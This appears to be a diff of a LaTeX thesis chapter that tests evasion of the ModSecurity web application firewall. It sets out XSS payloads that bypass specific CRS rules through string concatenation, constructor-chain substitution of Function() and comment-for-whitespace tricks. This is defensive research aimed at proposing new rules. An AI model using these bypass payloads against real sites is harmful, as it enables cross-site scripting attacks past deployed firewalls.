@@ -2,23 +2,6 @@
 \label{sec:multiiteration}
 This chapter states the evaluation results of multiple iterations of application of an evasion technique to the specified payloads. If a considerable bypass was found, the result will be detailed and used to derive additional firewall rules as shown under Section~\ref{sec:rulesproposal}.
 
-
-\subsubsection{Percent encoding + Unicode in JSON}
-The ModSecurity firewall blocks requests containing unicode escaped characters in JSON. (see Section~\ref{sec:unicodeinjsontest})
-In order to evade this rule, a payload containing a unicode escaped character was percent-encoded previous to submission.
-The ModSecurity firewall detected the unicode escape regardless and rejects the request:
-
-{\color{red} check this payload}
-\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode escape in json with additional percent encoding, label={lst:jsonunicodeurlenctest}]
-<payload>urllib.parse.quote('{ "body": "alert\\u0024{1}" }')</payload>
-<payload>%7B%20%22body%22%3A%20%22alert%5Cu0024%7B1%7D%22%20%7D</payload>
-<message>"Possible Unicode character bypass detected"</message>
-<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
-<fileDetails>[line "1263"] [id "920540"]<fileDetails>
-<MatchedData>"x5cu0024"</MatchedData>
-\end{lstlisting}
-
-
 \subsubsection{Double Percent encoding}
 \label{sec:doublepercenc}
 The payload from Listing~\ref{lst:urlencodedexampleblocked} was blocked by the ModSecurity firewall.
@@ -39,6 +22,35 @@ However, this payload would not be valid unless the target also performs multipl
 	data octet as the beginning of a percent-encoding, or vice versa in
 	the case of percent-encoding an already percent-encoded string.
 \end{quote}
+
+% \subsubsection{Percent encoding + Unicode in JSON}
+% \label{sec:perencunico}
+% In order to avoid a rule matching on the character sequence  The test payload:
+%
+% \begin{lstlisting}[style=basicStyle, language=Python]
+% 'prompt`\u0024{111}`'
+% \end{lstlisting}
+%
+% As seen in Section~\ref{sec:unicodeinjsontest}, the ModSecurity firewall using CRS4.1 blocks requests containing unicode escaped characters in JSON.
+% . 
+%
+% In order to bypass this rule, the tested payload was percent encoded using the Python function \verb|urllib.parse.quote_plus()| according to Section~\ref{sec:percenc}. The obscured payload:
+%
+% \begin{lstlisting}[style=basicStyle, language=Python]
+% 'prompt%60%24%7B111%7D%60'
+% \end{lstlisting}
+%
+% evaded the initially blocking rule with id \verb|
+% was blocked by the ModSecurity firewall using CRS4.1 according to 
+%
+% \begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode escape in json blocked, label={lst:jsonunicodeurlencblocked}]
+% <payload>urllib.parse.quote("alert\u0024{1}"')</payload>
+% <payload>%7B%20%22body%22%3A%20%22alert%5Cu0024%7B1%7D%22%20%7D</payload>
+% <message>"Possible Unicode character bypass detected"</message>
+% <file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
+% <fileDetails>[line "1263"] [id "920540"]<fileDetails>
+% <MatchedData>"x5cu0024"</MatchedData>
+% \end{lstlisting}
 
 
 \subsubsection{Double HTML character reference}
@@ -193,13 +205,8 @@ Through substituting a part of the \verb|eval()| function, matches on \verb|eval
 In this test, the payload logic should include multiple statements and reveal a secret by accessing a property.
 The basic implementation was blocked by the ModSecurity firewall:
 
-\begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor blocked, label={lst:funconblocked}]
-<payload>new Function('var s = "secret";prompt("something", s)')()</payload>
-
-<message>"Node.js Injection Attack 1/2"</message>
-<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
-<fileDetails>[line "52"] [id "934100"]<fileDetails>
-<MatchedData>"new Function("</MatchedData>
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=prompt blocked, label={lst:promptblocked}]
+<payload>`var s = "secret";prompt(s, s)`</payload>
 
 <message>"Javascript method detected"</message>
 <file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
@@ -207,16 +214,71 @@ The basic implementation was blocked by the ModSecurity firewall:
 <MatchedData>"prompt("</MatchedData>
 \end{lstlisting}
 
-To evade rule with id \verb|934100|, calling the \verb|Function()| constructor was substituted with \verb|[]['constructor']['constructor']()|. Using string concatenation to replace the character sequence \verb|'prompt'| with \verb|'promp + t'| successfully made the payload evade rule \verb|941390| and bypass the WAF. The bypassing payload:
+Using string concatenation to replace the character sequence \verb|'prompt'| with \verb|'promp + t'| successfully made the payload evade rule \verb|941390| and bypass the WAF. The bypassing payload:
 
-\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using square bracket notation]
-[]['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')()
+\begin{lstlisting}[style=basicStyle, language=Python]
+`var s = 'secret'; promp` + `t(s, s)`
+\end{lstlisting}
+
+If this payload is correctly injected into the evaluation test page mentioned under Section~\ref{sec:evaluation}, it results in the following HTML code (shortened):
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+<div id="div1">
+	<img src="0" onerror="`var s = 'secret'; promp` + `t(s, s)`">
+</div>
+\end{lstlisting}
+
+While this executes without exceptions, it does not achieve the wished-for effect. The effect achieved is the concatenation of the two strings \verb|`var s = 'secret'; promp`| and \verb|`t(s, s)`|. As mentioned under Section~\ref{sec:stringconc}, the payload string needs to be evaluted on the target in order to have a functioning payload after obscuring the statements inside with string concatenation. To achieve this, the \verb|Function()| constructor was used:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+new Function(`var s = 'secret'; promp` + `t(s, s)`)()
+\end{lstlisting}
+
+When evaluating the firewall against this payload, the payload was blocked according to rule:
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor blocked, label={lst:funconblocked}]
+<payload>new Function(`var s = 'secret'; promp` + `t(s, s)`)()</payload>
+
+<message>"Node.js Injection Attack 1/2"</message>
+<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
+<fileDetails>[line "52"] [id "934100"]<fileDetails>
+<MatchedData>"new Function("</MatchedData>
+\end{lstlisting}
+
+To evade rule with id \verb|934100|, calling the \verb|Function()| constructor was substituted by \verb|[]['constructor']['constructor']()| according to the technique mentioned under Section~\ref{sec:functionconstructor}:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+[]['constructor']['constructor'](`var s = 'secret'; promp` + `t(s, s)`)()
+\end{lstlisting}
+
+When evaluating this payload using the test code snipped mentioned under Section~\ref{sec:evaluation}, it turned out to be invalid. After parsing and injecting the payload into the HTML page according to the following statements:
+
+\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
+const injection = 
+  JSON.parse("{\"body\":\"[]['constructor']['constructor'](`var s = 'secret'; promp` + `t(s, s)`)()\"}")
+
+document.getElementById('div1').insertAdjacentHTML('afterbegin', `<img src=0 onerror=${injection.body}>`)
+\end{lstlisting}
+
+the resulting HTML code did not execute the given statements inside the payload as expected. It resulted in the following HTML code:
+
+\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
+<div id="div1">
+	<img src="0" onerror="[]['constructor']['constructor'](`var" s="secret" ;="" promp`="" +="" `t(s,="" s)`)()="">
+</div>
+\end{lstlisting}
+
+In order to avoid the splitting of statements synchronous to whitespaces in the payload string, JavaScript comment interference was used. 
+According to the JavaScript comment substitution technique stated under Section~\ref{sec:jscommentsub}, all whitespaces were replaced by JavaScript comments, creating the payload:
+
+\begin{lstlisting}[style=basicStyle, language=Python, caption=function constructor bypass payload using square bracket notation]
+[]['constructor']['constructor'](`var/**/s/**/=/**/'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()
 \end{lstlisting}
 
 Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:
 
 \begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using dot notation]
-[].constructor.constructor('var s = "secret";promp' + 't("something", s)')()
+[].constructor.constructor(`var/**/s/**/=/**/'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()
 \end{lstlisting}
 
 \subsubsection{Avoiding ()}
